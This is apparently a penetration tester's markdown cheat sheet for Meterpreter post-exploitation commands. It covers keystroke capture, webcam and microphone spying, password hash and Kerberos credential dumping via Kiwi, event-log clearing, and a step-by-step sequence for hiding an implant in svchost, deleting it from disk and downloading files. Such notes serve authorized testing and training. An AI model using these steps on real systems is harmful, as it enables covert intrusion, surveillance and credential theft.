# Meterpreter commands

- Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. 
- Remember to check all available commands running the help command once a Meterpreter session has started.

## Post Exploitation Modules Reference
- https://www.offensive-security.com/metasploit-unleashed/post-module-reference/
## Core commands

-   `background`: Backgrounds the current session
-   `exit`: Terminate the Meterpreter session
-   `guid`: Get the session GUID (Globally Unique Identifier)

-   `help`: Displays the help menu
-   `info`: Displays information about a Post module
-   `irb`: Opens an interactive Ruby shell on the current session
-   `load`: Loads one or more Meterpreter extensions
-   `migrate`: Allows you to migrate Meterpreter to another process
-   `run`: Executes a Meterpreter script or Post module
-   `sessions`: Quickly switch to another session

## File system commands

-   `cd`: Will change directory
-   `ls`: Will list files in the current directory (dir will also work)
-   `pwd`: Prints the current working directory
-   `edit`: will allow you to edit a file
-   `cat`: Will show the contents of a file to the screen
-   `rm`: Will delete the specified file
-   `search`: Will search for files
-   `upload`: Will upload a file or directory
-   `download`: Will download a file or directory

## Networking commands

-   `arp`: Displays the host ARP (Address Resolution Protocol) cache
-   `ifconfig`: Displays network interfaces available on the target system

-   `netstat`: Displays the network connections
-   `portfwd`: Forwards a local port to a remote service
-   `route`: Allows you to view and modify the routing table

## System commands

-   `clearev`: Clears the event logs
-   `execute`: Executes a command
-   `getpid`: Shows the current process identifier
-   `getuid`: Shows the user that Meterpreter is running as
-   `kill`: Terminates a process
-   `pkill`: Terminates processes by name
-   `ps`: Lists running processes
-   `reboot`: Reboots the remote computer
-   `shell`: Drops into a system command shell
-   `shutdown`: Shuts down the remote computer
-   `sysinfo`: Gets information about the remote system, such as OS

## Others Commands (these will be listed under different menu categories in the help menu)

-   `idletime`: Returns the number of seconds the remote user has been idle
-   `keyscan_dump`: Dumps the keystroke buffer
-   `keyscan_start`: Starts capturing keystrokes
-   `keyscan_stop`: Stops capturing keystrokes
-   `screenshare`: Allows you to watch the remote user's desktop in real time
-   `screenshot`: Grabs a screenshot of the interactive desktop
-   `record_mic`: Records audio from the default microphone for X seconds
-   `webcam_chat`: Starts a video chat
-   `webcam_list`: Lists webcams
-   `webcam_snap`: Takes a snapshot from the specified webcam
-   `webcam_stream`: Plays a video stream from the specified webcam
-   `getsystem`: Attempts to elevate your privilege to that of local system
-   `hashdump`: Dumps the contents of the SAM database
## Modules
### Kiwi Commands
    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

- Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.

## New Meterpreter Session Steps 
- Assuming you gained access, inserted AV Path Exception, wrote implant to disk and executed to catch you callback 
````
getuid #see your user context
getpid #identify pid you are running as (should be the pid of your msfvenom implant named whatever you assigned)
getprivs #see enabled process privileges
ps #view the whole process list and pick and svchost process within the same user context, get its pid number
migrate XXXX #to the pid of the svchost process 
getpid #confirm new pid
ps #ensure it is of the correct process 
del /path/to/implant #remove implant artifact from disk 
````
- Now you are set up and running as a thread in the address space of the `svchost.exe` process 
### File collect with meterpreter 
- `download` and `upload` commands 
- Ensure you are escaping the windows "\"
- Example:
````
download C:\\Users\\Administrator\\Desktop\\secret.txt
````
